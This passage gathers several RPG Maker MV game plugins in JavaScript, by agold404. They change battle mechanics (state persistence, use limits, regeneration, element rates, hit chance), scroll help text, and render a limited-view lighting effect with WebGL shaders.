r=p[k]; (p[k]=function f(a){
	const dataObj=this.enemy();
	const actions=dataObj.actions;
	this._genActionMap();
	this._genAddcond(this._enemyId);
	const sid=dataObj.addcond[actions.m.get(a)];
	return ( !sid||$gameSwitches.value(sid) ) && f.ori.apply(this,arguments);
}).ori=r;
}
})();


﻿"use strict";
/*:
 * @plugindesc 特殊死亡不清除的狀態
 * @author agold404
 *
 * @help 寫狀態note區
 * <notClearedWhenDead> // 無狀態本身不會因死亡而清除
 * <keepStatesWhenDead> // 身上的狀態不會因死亡而清除
 *
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;

const kw='keepStatesWhenDead';
const kwt='TRAIT_'+kw;
const kwget='get_'+kw;
const kwis='is_'+kw;
gbb.addEnum(kwt);

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits,c,t; if(!ts) ts=dataobj.traits=[];
	if(meta[kw]) ts.push({code:gbb[kwt],dataId:1,value:1,});
},
]);

t=[
i=>$dataStates[i].meta.alwaysNotCleared||$dataStates[i].meta.notClearedWhenDead,
i=>$dataStates[i].meta.alwaysNotCleared,
kwis,
gbb[kwt],
];

new cfc(Game_BattlerBase.prototype).add(kwis,function f(){
	return !!this.traits(f.tbl[3]).length;
},t).add('die',function f(){
	this._execDie=true;
	const rtv=f.ori.apply(this,arguments);
	this._execDie=undefined;
	return rtv;
}).add('clearStates',function f(){
	let rtv;
	if(!this._execDie) this._execDie=undefined;
	if(this._execDie&&this[f.tbl[2]]()) return; // keep all states when dead
	if(this._states){
		const notCleared=this._states.filter(f.tbl[0|!this._execDie]);
		const turns={};
		for(let x=0;x!==notCleared.length;++x) turns[x]=this._stateTurns[notCleared[x]];
		rtv=f.ori.apply(this,arguments);
		for(let x=0;x!==notCleared.length;++x) this._stateTurns[notCleared[x]]=turns[x];
		this._states=notCleared;
	}else rtv=f.ori.apply(this,arguments);
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 設定一技能或道具能被同一個人使用次數的上限
 * @author agold404
 *
 * @help 寫怪物note區
 * <useCntInBtl:數字>
 *
 * Technical Detail:
 * if (is in battle) && (count >= Number(.meta.useCntInBtl))
 * then return false
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=BattleManager;
p.getActLog=function(){
	if(!this._actLog) this._actLog=new Map();
	return this._actLog;
};
p._logItemUsed=function(item,s){
	const L=this.getActLog();
	// s' use
	{
	let m=L.get(s);
	if(!m) L.set(s,m=new Map());
	m.set(item,(m.get(item)|0)+1);
	m.set('all',(m.get('all')|0)+1); // s, all
	}
	// overall item used
	if(s) this._logItemUsed(item);
}
p.getItemUsedCount=function(item,s){
	let rtv=this.getActLog().get(s);
	if(!rtv) return 0;
	return rtv.get(item)|0;
};
k='initMembers';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.getActLog().clear();
	return rtv;
}).ori=r;
k='startAction';
r=p[k]; (p[k]=function f(){
	const s=this._subject;
	const rtv=f.ori.apply(this,arguments);
	if(this._action) this._logItemUsed(this._action.item(),s);
	return rtv;
}).ori=r;
}

{ const p=Game_BattlerBase.prototype;
k='canUse';
r=p[k]; (p[k]=function f(item){
	const sc=SceneManager._scene;
	if( sc && sc.constructor===Scene_Battle && BattleManager.getItemUsedCount(item,this)>=Number(item&&item.meta&&item.meta.useCntInBtl) ) return false;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc auto scrolling description
 * @author agold404
 *
 * @help if description in help window is toooo looong (x-direction), this plugin will scroll it
 *
 * Technical Detail:
 * "help window" refers to Window_Help
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

const wait1=60,wait2=120;

{ const p=Window_Base.prototype;
k='drawTextEx';
r=p[k]; (p[k]=function(text, x, y, _buf_for_idiotRMMV, _buf2, textState){
	if(text){
		this.resetFontSettings();
		const ts = textState || {};
		ts.index=0; ts.x=ts.maxX=ts.left=x; ts.y=y;
		ts.text = this.convertEscapeCharacters(text);
		ts.height = this.calcTextHeight(ts, false);
		while(ts.index < ts.text.length) this.processCharacter(ts);
		return ts.x - x;
	}else return 0;
}).ori=r;
k='processCharacter';
r=p[k]; (p[k]=function f(ts){
	const rtv=f.ori.apply(this,arguments);
	if(!(ts.maxX>=ts.x)) ts.maxX=ts.x;
	if(!ts.lineXs) ts.lineXs=[];
	ts.lineXs[ts.lineXs.length-1]=ts.x;
	return rtv;
}).ori=r;
k='processNewLine';
r=p[k]; (p[k]=function f(ts){
	if(!ts.lineXs) ts.lineXs=[ts.left]; // prev
	ts.lineXs.push(ts.left);
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Window_Help.prototype;
p.setText=function(text){
	if(this._text !== text){
		this._text = text;
		this._maxShiftWidth=0;
		this._isWait2Drawn=false;
		this.refresh();
	}
};
p.refresh=function(){
	this.contents.clear();
	if(this._maxShiftWidth>0){
		let shx=Graphics.frameCount-this._strtDrawnFrame-wait1;
		if(!(shx>=0)) shx=0;
		if(shx<this._maxShiftWidth) this.drawTextEx(this._text, this.textPadding()-shx, this._dy||0);
		else{
			if(!this._isWait2Drawn){
				this._isWait2Drawn=true;
				this.drawTextEx(this._text, this.textPadding()-this._maxShiftWidth, this._dy||0);
			}else if(shx>=this._maxShiftWidth+wait2){
				this._isWait2Drawn=false;
				this._strtDrawnFrame=Graphics.frameCount;
				this.drawTextEx(this._text, this.textPadding(), 0);
			}
		}
	}else{
		const padX=this.textPadding();
		this.drawTextEx(this._text, padX, this._dy||0, undefined,undefined, this._txtStat={})
		this._maxShiftWidth=(padX<<1)+(this._txtStat.maxX-this._txtStat.left)-this.contentsWidth();
		this._strtDrawnFrame=Graphics.frameCount;
	}
	this._lastDrawnFrame=Graphics.frameCount;
};
k='update';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	if( this._maxShiftWidth>0 && Graphics.frameCount!==this._lastDrawnFrame && Graphics.frameCount-this._strtDrawnFrame>wait1 && (!this._isWait2Drawn || Graphics.frameCount-this._strtDrawnFrame>=this._maxShiftWidth+wait1+wait2) ){
		this.refresh();
	}
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc MOG 防爆炸
 * @author agold404
 *
 * @help fix: when first use an skill that is not for friend, error!
 *
 * Technical Detail:
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=Scene_Skill.prototype;
k='refreshActorWD';
r=p[k]; (p[k]=function f(){
	if(!this._actorDataWindow){
		this._actorWindow.selectLast();
		this.refreshStatusActor();
	}
	f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc agold404's traits extension
 * @author agold404
 *
 * @help built in traits are not enough!
 *
 * Technical Detail:
 *
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r; const gbb=Game_BattlerBase;
if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum('TRAIT_REGENFIXED_HP').
	addEnum('TRAIT_REGENFIXED_MP').
	addEnum('TRAIT_REGENFIXED_TP').
	addEnum('TRAIT_REGENRATED_HP').
	addEnum('TRAIT_REGENRATED_MP').
	addEnum('TRAIT_REGENRATED_TP').
	addEnum('__END__');

{ const p=Scene_Boot.prototype , parse=(txt,traits,codeFixed,codeRated)=>{
	if(!txt) return;
	const ve=txt.split(',');
	const vals=ve[0].split("+");
	for(let v=0;v!==vals.length;++v){
		const idx=vals[v].indexOf("%");
		const val=idx===-1?Number(vals[v]):Number(vals[v].slice(0,idx))/100.0;
		if(val) traits.push({code:idx===-1?codeFixed:codeRated,dataId:Number(ve[1])||0,value:val});
	}
};
const tune=dataobj=>{ if(!dataobj) return;
	const t=dataobj.traits;
	if(!t) return;
	const meta=dataobj.meta;
	if(meta.regenHP) parse(meta.regenHP,t,gbb.TRAIT_REGENFIXED_HP,gbb.TRAIT_REGENRATED_HP);
	if(meta.regenMP) parse(meta.regenMP,t,gbb.TRAIT_REGENFIXED_MP,gbb.TRAIT_REGENRATED_MP);
	if(meta.regenTP) parse(meta.regenTP,t,gbb.TRAIT_REGENFIXED_TP,gbb.TRAIT_REGENRATED_TP);
};
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(tune);
	$dataClasses.forEach(tune);
	$dataWeapons.forEach(tune);
	$dataArmors.forEach(tune);
	$dataEnemies.forEach(tune);
	$dataStates.forEach(tune);
	f.ori.apply(this,arguments);
}).ori=r;
}

new cfc(Game_System.prototype).add('isRegenOnLongSteps',function f(){
	return !!this._isRegenOnLongSteps;
},undefined,true,true).add('isRegenOnLongSteps_set',function f(val){
	return this._isRegenOnLongSteps=val;
},undefined,true,true);

{ const p=Game_Battler.prototype,_k='regenerate';
p["_"+_k+'$p']=function f(code,eles){
	const arr=this.traits(code);
	// get eleRates
	eles=eles||{};
	for(let x=0;x!==arr.length;++x) if(isNaN(eles[arr[x].dataId])) eles[arr[x].dataId]=this.elementRate(arr[x].dataId);
	// cal weighted sum
	let rtv=0;
	for(let x=0;x!==arr.length;++x) rtv+=eles[arr[x].dataId]*arr[x].value;
	return rtv;
};
p["_"+_k+'_alignValue']=value=>value-0?parseInt(value<0?Math.min(-1,value):Math.max(1,value)):0;
p[_k+'Hp']=function(){
	const rate=isNaN(this._regenRate)?1:this._regenRate-0;
	const eles={};
	let value = ( this.mhp * (this._regenerate$p(gbb.TRAIT_REGENRATED_HP,eles)+this.hrg) + this._regenerate$p(gbb.TRAIT_REGENFIXED_HP,eles) );
	value=this._regenerate_alignValue(rate*value);
	value=Math.max(value, -this.maxSlipDamage());
	if(value) this.gainHp(value);
};
p[_k+'Mp']=function(){
	const rate=isNaN(this._regenRate)?1:this._regenRate-0;
	const eles={};
	let value = ( this.mmp * (this._regenerate$p(gbb.TRAIT_REGENRATED_MP,eles)+this.mrg) + this._regenerate$p(gbb.TRAIT_REGENFIXED_MP,eles) );
	value=this._regenerate_alignValue(rate*value);
	if(value) this.gainMp(value);
};
p[_k+'Tp']=function(){
	const rate=isNaN(this._regenRate)?1:this._regenRate-0;
	const eles={};
	let value=Math.floor(this.maxTp() * (this._regenerate$p(gbb.TRAIT_REGENRATED_TP,eles)+this.trg) ) + this._regenerate$p(gbb.TRAIT_REGENFIXED_TP,eles);
	for(let x=128,M=1<<30,a=Math.abs(value);x>>=1;){
		if(a*x<M){
			value=1.0*parseInt(value*x)/x;
			break;
		}
	}
	if(value) this.gainSilentTp(value);
};
new cfc(Game_Actor.prototype).add('turnEndOnMap',function f(){
	const stepsForTurn=this.stepsForTurn();
	const isUpdateTurn=0===$gameParty.steps()%stepsForTurn;
	this._regenRate=$gameSystem.isRegenOnLongSteps()?undefined:1.0/stepsForTurn;
	let regened=false;
	if(isUpdateTurn||!(0<stepsForTurn)){
		this.onTurnEnd();
		regened=true;
	}else if(this._regenRate!==undefined){
		this.clearResult();
		this.regenerateAll();
		regened=true;
	}
	if(regened&&0<this.result().hpDamage) this.performMapDamage();
	
	this._regenRate=undefined;
	return isUpdateTurn;
},undefined,true,true);
new cfc(Game_Screen.prototype).add('startFlashForDamage',function f(){
	// only be called in Scene_Map
	if(Graphics.frameCount<this._nextFlashFrameCount) return;
	this._nextFlashFrameCount=Graphics.frameCount+f.tbl[3];
	f.tbl[0][3]=f.tbl[1];
	this.startFlash(f.tbl[0], f.tbl[2]);
},[
[255, 0, 0, 64],
64,
32,
113, // d(nextFlashFrameCount)
]);
}

})();


﻿"use strict";
/*:
 * @plugindesc 使道具、技能可增加其他屬性；修改屬性計算為每個屬性各別對敵人計算加成後平均；屬性傷害倍率trait
 * @author agold404
 *
 * @help <addEle:額外第1種屬性id,額外第2種屬性id,...>
 * <屬性傷害倍率:[[屬性id,倍率]]>
 * <屬性傷害倍率:[[屬性id_1,倍率1],[屬性id_2,倍率2],...,[屬性id_n,倍率n]]>
 * <屬性吸收:[屬性id_1,屬性id_2,...,屬性id_n]>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='屬性傷害倍率',kw2='屬性吸收';
const kwt='TRAIT_'+kw;
const kwt2='TRAIT_'+kw2;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum(kwt2).
	addEnum('__END__');

new cfc(Scene_Boot.prototype).add('start',function f(){
	// order: editor menu
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[1]);
	$dataItems   .forEach(f.tbl[1]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ if(!dataobj||!dataobj.meta||!dataobj.traits) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const kvv=JSON.parse(meta[kw]);
		for(let x=0,kv;x!==kvv.length;++x){
			kv=kvv[x];
			if(kv[1]-0!==1) dataobj.traits.push({code:gbb[kwt],dataId:kv[0],value:kv[1]||0});
		}
	}
	if(meta[kw2]){
		const kv=JSON.parse(meta[kw2]);
		for(let x=0;x!==kv.length;++x) dataobj.traits.push({code:gbb[kwt2],dataId:kv[x],value:1,});
	}
},
dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta.addEle) dataobj.addEle=meta.addEle.split(',').map(x=>Number(x));
	else dataobj.addEle=undefined;
},
]);

{ const p=Game_Battler.prototype;
p.elementDmgRate=function(id){
	return this.traitsPi(Game_BattlerBase[kwt],id);
};
p.isElementAbsorbed=function(id){
	return this.traitsSet(Game_BattlerBase[kwt2]).uniqueHas(id);
};
}

{ const p=Game_Action.prototype;
p.getAllElements=function(item,itemOnly){
	item=item||this.item();
	return item && [
		!itemOnly && item.damage.elementId<0 ? this.subject().attackElements() : [item.damage.elementId] ,
		item.addEle ,
	];
};
p.calcElementRate=function f(target){
	const isRecover=this.isRecover() , subject=this.subject() , allEles=this._lastAllEles=this.getAllElements() , tmp={} , tmpDmg={};
	let rtv=0,eleCnt=0;
	for(let a=0;a!==allEles.length;++a){
		if(!allEles[a]) continue;
		eleCnt+=allEles[a].length;
		for(let x=0,arr=allEles[a];x!==arr.length;++x){
			if(tmp[arr[x]]===undefined){
				tmp[arr[x]]=target.elementRate(arr[x]);
				if(!isRecover && 0<tmp[arr[x]] && target.isElementAbsorbed(arr[x])) tmp[arr[x]]*=-1;
			}
			if(tmpDmg[arr[x]]===undefined) tmpDmg[arr[x]]=subject.elementDmgRate(arr[x]);
			rtv+=tmp[arr[x]]*tmpDmg[arr[x]];
		}
	}
	return eleCnt?rtv/eleCnt:1;
};
}

})();


"use strict";
/*:
 * @plugindesc 變更命中/迴避計算方式為: Math.random()<(命中率-迴避率)
 * @author agold404
 *
 * @help 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=Game_Action.prototype;
k='itemHit';
r=p[k];
(p[k]=function(target){
	if(this.isPhysical()) return (this.item().successRate*this.subject().hit*0.01)-target.eva;
	else if(this.isMagical()) return (this.item().successRate*this.subject().hit*0.01)-target.mev;
	else return this.item().successRate*0.01;
}).ori=r;
k='itemEva';
r=p[k];
(p[k]=function(target){
	return 0;
/*
	if(this.isPhysical()) return target.eva-(this.item().successRate*this.subject().hit*0.01);
	else if(this.isMagical()) return target.mev-(this.item().successRate*0.01);
	else return 0;
*/
}).ori=r;
}

})();





﻿"use strict";
/*:
 * @plugindesc 在狀態中設定另一個 sv 圖、 battleHud 臉圖 (皆僅對角色有效，對怪物無效) 、循環動畫
 * @author agold404
 *
 * @help 寫狀態note區
 * <alt_sv:不含副檔名的檔名>
 * <alt_bhudFaceId:角色id>
 * <loopAni:動畫id>
 *
 * <alt_enemyImg:專改怪物圖片用的不含副檔名的檔名>
 * 
 * Technical Detail:
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Actor.prototype;
k='battlerName';
r=p[k]; (p[k]=function f(){
	const stat=this.states().find(f.forEach);
	return stat?stat.meta.alt_sv:f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=stat=>stat.meta.alt_sv;
p.actorId_bhudFace=function(){
	const stat=this.states().find(stat=>stat.meta.alt_bhudFaceId);
	return stat?stat.meta.alt_bhudFaceId:this._actorId;
};
}

{ const p=Game_Enemy.prototype;
k='battlerName';
r=p[k]; (p[k]=function f(){
	const stat=this.states().find(f.forEach);
	return stat?stat.meta.alt_enemyImg:f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=stat=>stat.meta.alt_enemyImg;
}

{ const p=BattleManager;
p.setLoopAni=function(btlr,bool_stat){
	// bool_stat: true/false = on/off
	if(!this._loopAni_off) this._loopAni_off=new Set();
	if(!bool_stat) this._loopAni_off.add(btlr);
	else this._loopAni_off.delete(btlr);
};
p.isLoopAniOff=function(btlr){
	return !!(this._loopAni_off&&this._loopAni_off.has(btlr));
};
p.setCurrentLoopAniOn=function(){
	this.setLoopAni(this._subject,true);
};
p.setCurrentLoopAniOff=function(){
	this.setLoopAni(this._subject,false);
};
}

const none=()=>{};
{ const p=Sprite_Battler.prototype;
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if( this._battler){
		if(!this._loopAnis) this._loopAnis=new Map();
		if(!BattleManager.isLoopAniOff(this._battler)) this._battler.states().forEach(stat=>{
			if(stat.meta.loopAni===undefined) return;
			const sp=stat.meta.loopAni.split(',');
			const idx_o=Number(sp[0]),disappear=!(sp.indexOf("appear",1)+1)||sp.indexOf("disappear",1)+1,fixed=sp.indexOf("fixed",1)+1;
			const ani=$dataAnimations[idx_o<0?-idx_o:idx_o];
			if(ani){
				let oldAni=this._loopAnis.get(idx_o),x,y;
				if(oldAni){
					if(oldAni.isPlaying()){
						oldAni.alpha=disappear?this.alpha:1;
					}else{
						x=oldAni._setx; y=oldAni._sety;
						oldAni.parent.removeChild(oldAni);
						oldAni=undefined;
					}
				}
				if(!oldAni){
					this.startAnimation(ani,idx_o<0,0);
					const arr=this._animationSprites;
					const sp=arr.pop();
					sp.z=this.z-1;
					this._loopAnis.set(idx_o,sp);
					if(fixed){
						if(x!==undefined){
							sp._setx=sp.x=x; sp._sety=sp.y=y;
						}else{
							sp.updatePosition();
							sp._setx=sp.x; sp._sety=sp.y;
						}
						sp.updatePosition=none;
					}
				}
			}
		});
	}
	return rtv;
}).ori=r;
p[k].forEach=x=>$dataStates.tbl.has(x);
}

if(typeof Battle_Hud!=='undefined'){
const p=Battle_Hud.prototype;
k='update_face';
r=p[k]; (p[k]=function f(){
	if(this._face){
		const f2id=this._battler.actorId_bhudFace();
		if(this._btlrFaceId!==f2id){
			this._face.bitmap=ImageManager.loadBHud( "Face_" + (this._btlrFaceId=f2id) );
			this._face_data[4]=false;
		}
	}
	f.ori.apply(this,arguments);
}).ori=r;
}

})();



"use strict";
/*:
 * @plugindesc 光圈效果
 * @author agold404
 *
 * @help viewRadius1 , _viewRadius1 , viewRadius2 , _viewRadius2 ; r1<=r2
 * dataEvent.meta.light
 * dataEvent.meta.lightG
 *
 * use
 * $gameScreen.limitedView=true;
 * to turn on
 * 
 * use
 * $gameScreen.limitedView=false;
 * to turn off.
 * 
 * or use
 * $gameScreen.limitedView = a_number_between_0_and_1;
 * to semi-limited the view.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

const PI2=Math.PI*2;
const tuneOpt=function(opt){
	opt=opt||{};
	opt.transparent=opt.alpha=!(opt.preserveDrawingBuffer=opt.premultipliedAlpha=opt.depth=opt.stencil=opt.antialias=false);
	opt.depth=true;
	opt.powerPreference="low-power";
	return opt;
};
{ const p=PIXI.glCore;
p._tuneOpt=tuneOpt;
k='createContext';
r=p[k]; (p[k]=function f(c,opt){
	return f.ori.call(this,c,this._tuneOpt(opt));
}).ori=r;
}
{ const p=Graphics;
p._tuneOpt=tuneOpt;
p._createRenderer = function() {
	const log=window.console.log; window.console.log=()=>{};
	
	const width=this._width , height=this._height;
	const options=this._tuneOpt({ view: this._canvas, transparent: true, forceCanvas: this._forceCanvas,
		depth:false,
		});
	try {
		switch (this._rendererType) {
		case 'canvas':
			this._renderer = new PIXI.CanvasRenderer(width, height, options);
			break;
		case 'webgl':
			this._renderer = new PIXI.WebGLRenderer(width, height, options);
			break;
		default:
			this._renderer = PIXI.autoDetectRenderer(width, height, options);
			break;
		}
		if(this._renderer && this._renderer.textureGC) this._renderer.textureGC.maxIdle = 1;
	} catch (e) { this._renderer = null; }
	
	window.console.log=log;
	if(!this._renderer && this._rendererType==='auto'){
		let newHref=location.pathname;
		newHref+="?"; if(location.search) newHref+=location.search;
		newHref+=(location.search&&newHref.slice(-1)!=="&"?"&":"")+'canvas';
		newHref+="#"; if(location.hash) newHref+=location.hash;
		location.href=newHref;
	}
};
}

{ const p=Tilemap.prototype;
k='renderCanvas';
r=p[k]; (p[k]=function f(renderer){
	if($gameScreen.limitedView){
		const ctx=renderer.context;
		ctx.save();
		
		const scale=f.scale;
		
		const tc=f.tbl[0],c=ctx.canvas;
		const w=tc.width  =c.width  *scale;
		const h=tc.height =c.height *scale;
		const tctx=tc.getContext('2d');
		
		f.tbl[1].ctx=tctx;
		f.tbl[1].scale=scale;
		tctx.globalCompositeOperation='darken';
		tctx.fillStyle="rgba(0,0,0,"+((1-$gameScreen.limitedView)||0)+")";
		tctx.fillRect(0,0,w,h);
		this.children.forEach(f.tbl[1]);
		
		ctx.globalCompositeOperation='destination-in';
		ctx.drawImage(f.tbl[0],0,0,c.width,c.height);
		
		ctx.globalCompositeOperation='source-atop';
		f.ori.apply(this,arguments);
		
		ctx.restore();
	}else f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
	document.createElement('canvas'),
	function f(p){
		if(p.viewRadius2){
			const ctx=f.ctx,scale=f.scale;
			const r2=p.viewRadius2()*scale; if(!r2) return;
			const x=p.x*scale,y=p.y*scale;
			const r1=p.viewRadius1()*scale;
			if(r2>r1){
				const grd=ctx.createRadialGradient(x , y, r1, x, y, r2);
				grd.addColorStop(0, '#000000');
				grd.addColorStop(1, 'rgba(0,0,0,0)');
				ctx.fillStyle = grd;
			}else ctx.fillStyle = '#000000';
			ctx.beginPath();
			ctx.arc(x,y,r2+2,0,PI2);
			ctx.fill();
		}
	},
];
p[k].scale=0.25;
}
{ const p=ShaderTilemap.prototype;
k='renderWebGL';
r=p[k]; (p[k]=function f(renderer){
	f.ori.call(this, renderer );
	if($gameScreen.limitedView) this._limitedView2(renderer);
}).ori=r;
(p._limitedView2=function f(renderer){
	const gl=renderer.gl; if(!gl) return;
	const p=this.player;
	const old_ab=gl.getParameter(gl.ARRAY_BUFFER_BINDING);
	const old_abi=gl.getParameter(gl.ELEMENT_ARRAY_BUFFER_BINDING);
	const old_prog=gl.getParameter(gl.CURRENT_PROGRAM);
	// get attribute infos
	const old_attr_cnt=gl.getProgramParameter(old_prog,gl.ACTIVE_ATTRIBUTES);
	const old_attr=[];
	const old_attr_idx=[];
	const old_attr_size=[];
	const old_attr_type=[];
	const old_attr_isNorm=[];
	const old_attr_stride=[];
	const old_attr_offset=[];
	for(let i=0;i!==old_attr_cnt;++i){
		old_attr[i]=gl.getActiveAttrib(old_prog,i);
		if(!old_attr[i]) continue;
		old_attr_idx[i]=gl.getAttribLocation(old_prog,old_attr[i].name);
		old_attr_size[i]=gl.getVertexAttrib(old_attr_idx[i],gl.VERTEX_ATTRIB_ARRAY_SIZE);
		old_attr_type[i]=gl.getVertexAttrib(old_attr_idx[i],gl.VERTEX_ATTRIB_ARRAY_TYPE);
		old_attr_isNorm[i]=gl.getVertexAttrib(old_attr_idx[i],gl.VERTEX_ATTRIB_ARRAY_NORMALIZED);
		old_attr_stride[i]=gl.getVertexAttrib(old_attr_idx[i],gl.VERTEX_ATTRIB_ARRAY_STRIDE);
		old_attr_offset[i]=gl.getVertexAttribOffset(old_attr_idx[i],gl.VERTEX_ATTRIB_ARRAY_POINTER);
	}
	
	if(!f.tbl.prog){
		const shaderV=f.tbl.shaderV||(f.tbl.shaderV=gl.createShader(gl.VERTEX_SHADER));
		const shaderF=f.tbl.shaderF||(f.tbl.shaderF=gl.createShader(gl.FRAGMENT_SHADER));
		
		gl.shaderSource(shaderV, f.tbl.shaderSrcV);
		gl.shaderSource(shaderF, f.tbl.shaderSrcF);
		
		gl.compileShader(shaderV);
		gl.compileShader(shaderF);
		
		const prog=f.tbl.prog=gl.createProgram();
		gl.attachShader(prog, shaderV); 
		gl.attachShader(prog, shaderF);
		gl.linkProgram(prog);
		
		gl.deleteShader(shaderV);
		gl.deleteShader(shaderF);
		
		if(f.tbl.glbuf){
		}else{
			f.tbl.glbuf_i =gl.createBuffer();
			f.tbl.glbuf   =gl.createBuffer();
		}
	}
	const prog=f.tbl.prog;
	gl.useProgram(prog);
	
	const ATTRIBUTES = 5 , data = [] , eles = [];
	f.tbl.forEach.a=ATTRIBUTES;
	f.tbl.forEach.eles=eles;
	f.tbl.forEach.data=data;
	f.tbl.forEach.j=0;
	f.tbl.forEach.k=0;
	this.children.forEach(f.tbl.forEach);
	gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, f.tbl.glbuf_i);
	gl.bindBuffer(gl.ARRAY_BUFFER, f.tbl.glbuf);
	gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array(eles), gl.STATIC_DRAW);
	gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(data), gl.STATIC_DRAW);
	const loc_reso = gl.getUniformLocation(prog, "u_resolution");
	const loc_base = gl.getUniformLocation(prog, "u_baseAlpha");
	let alpha=Math.min(Math.max(1-$gameScreen.limitedView||0,0),1);
	{ const c=gl.canvas;
	gl.uniform2f(loc_reso, c.width, c.height);
	gl.uniform1f(loc_base, alpha);
	}
	
	const loc_cent = gl.getAttribLocation(prog, "a_center");
	const loc_rad2 = gl.getAttribLocation(prog, "a_radius2");
	const loc_type = gl.getAttribLocation(prog, "a_dir");
	if(!f.tbl.enabled){
		f.tbl.enabled=true;
		gl.enableVertexAttribArray(loc_cent);
		gl.enableVertexAttribArray(loc_rad2);
		gl.enableVertexAttribArray(loc_type);
	}
	gl.vertexAttribPointer(loc_cent, 2, gl.FLOAT, false, ATTRIBUTES * Float32Array.BYTES_PER_ELEMENT,  0);
	gl.vertexAttribPointer(loc_rad2, 2, gl.FLOAT, false, ATTRIBUTES * Float32Array.BYTES_PER_ELEMENT,  8);
	gl.vertexAttribPointer(loc_type, 1, gl.FLOAT, false, ATTRIBUTES * Float32Array.BYTES_PER_ELEMENT, 16);
	
	gl.blendFunc(gl.ONE,gl.ONE);
	if(!f.ext) f.ext=gl.getExtension('EXT_blend_minmax'); // https://developer.mozilla.org/en-US/docs/Web/API/EXT_blend_minmax
	gl.blendEquation(f.ext.MAX_EXT); // https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/blendEquation
	gl.colorMask(0,0,0,1);
	gl.clearColor(0.0, 0.0, 0.0, alpha);
	gl.clear(gl.COLOR_BUFFER_BIT);
	
	gl.drawElements(gl.TRIANGLES, eles.length, gl.UNSIGNED_SHORT, 0);
	
	// premultiply alpha. final alpha = 1
	{
	gl.blendFunc(gl.ONE,gl.DST_ALPHA);
	gl.blendEquation(gl.FUNC_ADD);
	gl.colorMask(1,1,1,1); // enable
	const tbl2=f.tbl.prog2;
	if(!tbl2.prog){
		const shaderV=tbl2.shaderV||(tbl2.shaderV=gl.createShader(gl.VERTEX_SHADER));
		const shaderF=tbl2.shaderF||(tbl2.shaderF=gl.createShader(gl.FRAGMENT_SHADER));
		
		gl.shaderSource(shaderV, tbl2.shaderSrcV);
		gl.shaderSource(shaderF, tbl2.shaderSrcF);
		
		gl.compileShader(shaderV);
		gl.compileShader(shaderF);
		
		const prog=tbl2.prog=gl.createProgram();
		gl.attachShader(prog, shaderV); 
		gl.attachShader(prog, shaderF);
		gl.linkProgram(prog);
		
		gl.deleteShader(shaderV);
		gl.deleteShader(shaderF);
		
		if(tbl2.glbuf){
		}else{
			tbl2.glbuf_i =gl.createBuffer();
			tbl2.glbuf   =gl.createBuffer();
		}
		
		
		tbl2.eles=new Uint16Array([
			0,1,2,
			2,1,3,
		]);
		tbl2.data=new Float32Array([-1,1,-2,2]);
		/*	y=0
		x=0	[0]=-1	[1]=1	x=MAX
			[2]=-2	[3]=2
			y=MAX
		val<0.0 => x=0
		val**2<1.5 => y=0
		*/
	}
	const prog2=tbl2.prog;
	gl.useProgram(prog2);
